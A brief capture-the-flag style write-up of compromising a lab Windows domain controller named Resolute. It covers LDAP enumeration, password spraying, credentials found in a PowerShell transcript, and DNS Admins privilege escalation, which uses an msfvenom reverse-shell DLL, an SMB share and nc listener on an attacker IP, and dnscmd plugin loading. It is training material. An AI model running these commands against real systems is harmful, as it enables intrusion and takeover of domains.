Started with a nmap scan
```
53 DNS
88 Kerberos
135
139
389 LDAP
445
636
3268 LDAP
3269
5985
```
Domain `megabank.local` Hostname `RESOLUTE` 
Testing out LDAP we have anonymous bind and we got a list of users and looking in the account description one user has a password in there `marko:Welcome123!` but these creds don't work so checking the password against all the user names and got a valid login `melanie:Welcome123!` there also is no account lockout we need to get a bloodhound data im using rusthound to do this `rusthound --domain megabank.local -u melanie -p Welcome123! -z` bloodhound does not show anything but we can winrm into the host and we can get the user flag after looking around the file system for a while I ran a `ls -force` on the `C:\` drive and found a folder called `PSTranscripts` and inside there is a powershell history file and it has creds for the user `ryan` `ryan:Serv3r4Admin4cc123!` we can winrm into this account now and looking at the groups were apart of `DNS Admins` so we can use `dnscmd.exe` to get to admin user first we use msfvenom to make a dll file `msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.16.3 lport=443 -f dll -o 1.dll` then we need to start a smb server `impacket-smbserver s .` now we need to go to the host machine and do `dnscmd.exe /config /serverlevelplugindll \\10.10.16.3\s\1.dll` strart up are `rlwrap nc -lvnp 443` and then run these commands 
```
sc.exe \\resolute stop dns
sc.exe \\resolute start dns
```
now we have a shell as admin user 